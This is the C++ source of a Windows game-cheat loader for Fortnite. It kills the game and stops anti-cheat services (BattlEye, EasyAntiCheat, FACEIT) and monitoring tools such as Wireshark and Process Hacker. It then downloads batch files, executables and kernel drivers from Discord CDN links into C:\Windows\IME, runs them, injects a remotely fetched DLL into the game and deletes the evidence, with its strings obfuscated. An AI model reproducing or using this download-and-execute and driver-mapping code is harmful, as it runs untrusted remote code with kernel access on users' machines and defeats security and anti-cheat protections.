#include <iostream>
#include "incprogram.h"
using namespace std;
#include "program.h"
#include "xor.h"
#include <random>
#include "Discord.h"
#include <urlmon.h>
#include <iostream>
#pragma comment(lib, "urlmon.lib")
#include <stdio.h>
#include <string>
#include <windows.h>
#include <Windows.h>
#include <tchar.h>
#include <Wininet.h>
#include <filesystem>
#pragma comment(lib, "wininet.lib")
#define _WIN32_WINNT 0x0500
using namespace std;


string replaceAll(string subject, const string& search,
	const string& replace) {
	size_t pos = 0;
	while ((pos = subject.find(search, pos)) != string::npos) {
		subject.replace(pos, search.length(), replace);
		pos += replace.length();
	}
	return subject;
}

string DownloadString(string URL) {
	HINTERNET interwebs = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
	HINTERNET urlFile;
	string rtn;
	if (interwebs) {
		urlFile = InternetOpenUrlA(interwebs, URL.c_str(), NULL, NULL, NULL, NULL);
		if (urlFile) {
			char buffer[2000];
			DWORD bytesRead;
			do {
				InternetReadFile(urlFile, buffer, 2000, &bytesRead);
				rtn.append(buffer, bytesRead);
				memset(buffer, 0, 2000);
			} while (bytesRead);
			InternetCloseHandle(interwebs);
			InternetCloseHandle(urlFile);
			string p = replaceAll(rtn, "|n", "\r\n");
			return p;
		}
	}
	InternetCloseHandle(interwebs);
	string p = replaceAll(rtn, "|n", "\r\n");
	return p;
}

std::string random_string(const int len) { /*  For Cool Responses  */
	const std::string alpha_numeric("ABCDEFGHIJKLMNOPRSTUVZabcdefghijklmnoprstuvz0123456789");
	std::default_random_engine generator{ std::random_device{}() };
	const std::uniform_int_distribution< std::string::size_type > distribution{ 0, alpha_numeric.size() - 1 };
	std::string str(len, 0);
	for (auto& it : str) {
		it = alpha_numeric[distribution(generator)];
	}

	return str;
}
void Initializing()
{
	system(_xor_("taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe >nul 2>&1").c_str());
	system(_xor_("taskkill /f /im FortniteClient-Win64-Shipping_BE.exe >nul 2>&1").c_str());
	system(_xor_("taskkill /f /im FortniteClient-Win64-Shipping.exe >nul 2>&1").c_str());
	system(_xor_("taskkill /f /im EpicGamesLauncher.exe >nul 2>&1").c_str());
	system(_xor_("taskkill /f /im FortniteLauncher.exe >nul 2>&1").c_str());
	system(_xor_("sc stop BEService >nul 2>&1").c_str());
	system(_xor_("sc stop BEDaisy >nul 2>&1").c_str());
	system(_xor_("sc stop EasyAntiCheat >nul 2>&1").c_str());
	system(_xor_("sc stop EasyAntiCheatSys >nul 2>&1").c_str());
	system(_xor_("net stop FACEIT >nul 2>&1").c_str());
	system(_xor_("net stop ESEADriver2 >nul 2>&1").c_str());
	system(_xor_("sc stop HTTPDebuggerPro >nul 2>&1").c_str());
	system(_xor_("sc stop KProcessHacker3 >nul 2>&1").c_str());
	system(_xor_("sc stop KProcessHacker2 >nul 2>&1").c_str());
	system(_xor_("sc stop KProcessHacker1 >nul 2>&1").c_str());
	system(_xor_("sc stop wireshark >nul 2>&1").c_str());
	system(_xor_("sc stop npf >nul 2>&1").c_str());
	std::cout << _xor_("\n\n    discord.gg/X2C3pDQhMX | Loader Developer: SMUV#9460 | Cheat Developer: SMUV#9460");
	system("start https://discord.gg/X2C3pDQhMX");
	Sleep(5000);
	//system(_xor_("taskkill /f /im GTA5.exe >nul 2>&1").c_str());
}
void driver()
{
	try
	{
		URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/784013109526134798/796850418411241522/mapdriver.bat", "C://Windows//IME//mapdriver.bat", NULL, NULL);
		URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/784013109526134798/796849306732593192/prflog_cfg.exe", "C://Windows//IME//prflog_cfg.exe", NULL, NULL);
		URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/784013109526134798/796849305745883136/Driver.sys", "C://Windows//IME//Driver.sys", NULL, NULL);
		URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/784013109526134798/796849307999141908/prflog64.sys", "C://Windows//IME//prflog64.sys", NULL, NULL);
		system("C://Windows//IME//mapdriver.bat >nul");
		Sleep(2000);
		remove("C://Windows//IME//driver.sys");
		system("cls");
		std::cout << _xor_("\n\n    Stage 1: Okay!");
		Sleep(2000);
	}
	catch (int e)
	{
		std::cout << _xor_("\n\n    Failure: Couldnt install driver. DM moodless#0001 to report the problem.");
		system("pause >nul");
	}
}
string replaceAll(string subject, const string& search,
	const string& replace) {
	size_t pos = 0;
	while ((pos = subject.find(search, pos)) != string::npos) {
		subject.replace(pos, search.length(), replace);
		pos += replace.length();
	}
	return subject;
}
DWORD_PTR FindProcessId(const std::string processName)
{
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
		return 0;

	Process32First(processesSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile))
	{
		CloseHandle(processesSnapshot);
		return processInfo.th32ProcessID;
	}

	while (Process32Next(processesSnapshot, &processInfo))
	{
		if (!processName.compare(processInfo.szExeFile))
		{
			CloseHandle(processesSnapshot);
			return processInfo.th32ProcessID;
		}
	}

	CloseHandle(processesSnapshot);
	return 0;
}
Discord* g_Discord;
void Connect()
{
	system("cls");      //clears console after login
	std::cout << _xor_("\n    Connecting..") << "\n";
	Sleep(3000);
	string LoaderVersion = DownloadString("https://moodless0001.000webhostapp.com/Plague/loaderVersion.txt"); //loader version
	if (LoaderVersion == "1.1.3") // 
	{
		//loader version ok
	}
	else if (LoaderVersion == "0") //makes the loader offline
	{
		std::cout << _xor_("\n    Failure: INFO: Loader is offline!");
		int msgboxIDa = MessageBoxA(0, "Loader is offline!", "Failure", MB_ICONWARNING | MB_OK);
		switch (msgboxIDa)
		{
		case IDOK:
		{
			exit(0);
		}
		}
	}
	else
	{
		std::cout << _xor_("\n    Failure: INFO: Loader is outdated!");
		int msgboxID2 = MessageBoxA(0, "A new Version of the Loader is avaible. \n\n\n Do you want to get redirected to the new Version?", "Update", MB_ICONWARNING | MB_YESNO);
		switch (msgboxID2)
		{
		case IDYES:
		{
			system("cls");
			exit(0);
		}

		case IDNO:
		{
			exit(0);
		}
		}
	}
}
int main()
{
	system("color B");
	std::cout << _xor_("\n\n    Loading..");
	g_Discord->Initialize();
	g_Discord->Update();
	SetConsoleTitleA(random_string(30).c_str());
	Initializing();
	Connect();
	system("cls");      //clears console after login
	std::cout << _xor_("\n\n    progress 30.0%") << "\n";
	Sleep(300);
	//system("cls");
	std::cout << _xor_("\n    Installing Drivers..") << "\n";
	Sleep(4000);
	driver();
	std::cout << _xor_("\n\n    progress 66.3%") << "\n";
	Sleep(300);
	system("cls");
	std::cout << _xor_("\n\n    progress 100.0%") << "\n";
	Sleep(1000);
	system("cls");
	main::program();
}

void main::program()
{
	std::cout << _xor_("\n\n");
	std::cout << _xor_("\n    Result 1: Okay!");
	std::cout << _xor_("\n\n    Help: You must be in Windowed Fullsreen. Be sure you press F2 in the lobby else mostly it wont inject!");
	std::cout << _xor_("\n\n    Start FortniteClient-Win64-Shipping.exe, F2 to Inject. Console will disapear once game is launched.");
FindProcess:
	while (true)
	{
		if (FindProcessId("FortniteClient-Win64-Shipping.exe") != 0) //FortniteClient-Win64-Shipping.exe
		{
			std::cout << _xor_("\n    Process Found!");
			Sleep(3000);
			::ShowWindow(::GetConsoleWindow(), SW_HIDE); // show the console again=  ::ShowWindow(::GetConsoleWindoWWWw(), SW_SHOW);
			system("color B");
			while (true)
			{
				Sleep(10);

				if (GetAsyncKeyState(VK_F2))
				{
				procnotfoundretry:
					HWND hwnd;
					hwnd = FindWindowA(0, _xor_("Fortnite  ").c_str()); //Grand Theft Auto V
					if (hwnd != 0)
					{

						system("cls");

						::ShowWindow(::GetConsoleWindow(), SW_SHOW);
						std::cout << _xor_("\n\n     Injecting..");
						Beep(523, 500);

						try
						{
							string dll = DownloadString("https://moodless0001.000webhostapp.com/Plague/dlls/rageDLL-320d1a474a0dece4a7fac9136406fd6d63d62ec5.txt"); //cheat dll
							//Injection Proccess
							URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/784013109526134798/796850932184645692/inject.bat", "C://Windows//IME//inj.bat", NULL, NULL);
							HRESULT hr = URLDownloadToFile(NULL, _T(dll.c_str()), _T("C://Windows//IME//dll.dll"), 0, NULL);
							URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/784013109526134798/796851078146555914/smap.exe", "C://Windows//IME//smap.exe", NULL, NULL);
							Sleep(5000);
							system("C://Windows//IME//inj.bat >nul");
							remove("C://Windows//IME//dll.dll");
							remove("C://Windows//IME//smap.exe");
							remove("C://Windows//IME//inj.bat");
							Beep(223, 700);
							system("color B");
							std::cout << _xor_("\n     Injected.\n\n");
							std::cout << _xor_("\n\n     Results: Loading and injection should be succesfull.\n\n");
							Sleep(5000);
							exit(1);
						}
						catch (int Inj)
						{
							int InjFailed = MessageBoxA(0, "\n\n Failed to Inject, do you want to retry?", "Failed", MB_ICONWARNING | MB_YESNO);
							switch (InjFailed)
							{
							case IDYES:
							{
								goto procnotfoundretry;
							}
							case IDNO:
							{
								exit(0);
							}
							}
						}

					}
					else
					{
						int msgboxID3 = MessageBoxA(0, "Failed to find Process Window\n\n\n Couldn´t find process, do you want to retry?", "Failed", MB_ICONWARNING | MB_YESNO);
						switch (msgboxID3)
						{
						case IDYES:
						{
							goto procnotfoundretry;
						}
						case IDNO:
						{
							int msgboxID4 = MessageBoxA(0, "Do you want to exit the Loader and Injection Process?", "Information", MB_YESNO | MB_ICONINFORMATION);
							switch (msgboxID4)
							{
							case IDYES:
							{
								exit(1);
							}
							case IDNO:
							{
								goto procnotfoundretry;
							}
							}
						}
						}
					}
				}
			}
		}
	}
	
}